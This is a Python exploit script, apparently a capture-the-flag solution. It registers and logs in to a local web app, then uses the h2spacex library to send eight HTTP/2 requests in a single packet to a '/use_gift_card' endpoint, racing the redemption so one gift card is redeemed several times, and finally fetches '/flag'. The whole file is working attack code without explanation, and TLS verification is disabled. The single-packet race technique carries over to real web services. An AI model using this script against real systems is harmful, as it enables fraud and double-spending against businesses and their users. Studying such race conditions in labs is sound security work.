from h2spacex import H2OnTlsConnection
from time import sleep
import random
from h2spacex import h2_frames
import requests
requests.packages.urllib3.disable_warnings()

host = '127.0.0.1'
port = 1337
randname = f"skibidi{random.randint(1000,10000)}"
try_num = 8

data = {
    'username': f'{randname}{try_num}',
    'password': 'password',
}

response = requests.post(f'https://{host}:{port}/register', data=data, verify = False)

data = {
    'username': f'{randname}{try_num}',
    'password': 'password',
}
s = requests.session()
response = s.post(f'https://{host}:{port}/login', data=data, verify = False, allow_redirects = False)
cookie = response.cookies["session"]

h2_conn = H2OnTlsConnection(
    hostname=host,
    port_number=port
)

headers = f"""Cookie: session={cookie}
"""

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []
all_data_frames = []

for i in range(0, try_num):

    header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_get_request_frames(  # noqa: E501
        method='POST',
        headers_string=headers,
        scheme='https',
        stream_id=stream_ids_list[i],
        authority=host,
        path='/use_gift_card',
        body=None
    )
    #print(header_frames_without_last_byte, last_data_frame_with_last_byte)
    all_headers_frames.append(header_frames_without_last_byte)
    all_data_frames.append(last_data_frame_with_last_byte)

temp_headers_bytes = b''
for h in all_headers_frames:
    temp_headers_bytes += bytes(h)

temp_data_bytes = b''
for d in all_data_frames:
    temp_data_bytes += bytes(d)
print(len(temp_headers_bytes), len(temp_data_bytes))

h2_conn.setup_connection()
h2_conn.send_ping_frame()
h2_conn.send_frames(temp_headers_bytes)
sleep(0.5)
h2_conn.send_ping_frame()
h2_conn.send_frames(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)

sleep(3)
h2_conn.close_connection()
print(s.get(f"https://{host}:{port}/flag", verify = False).text)
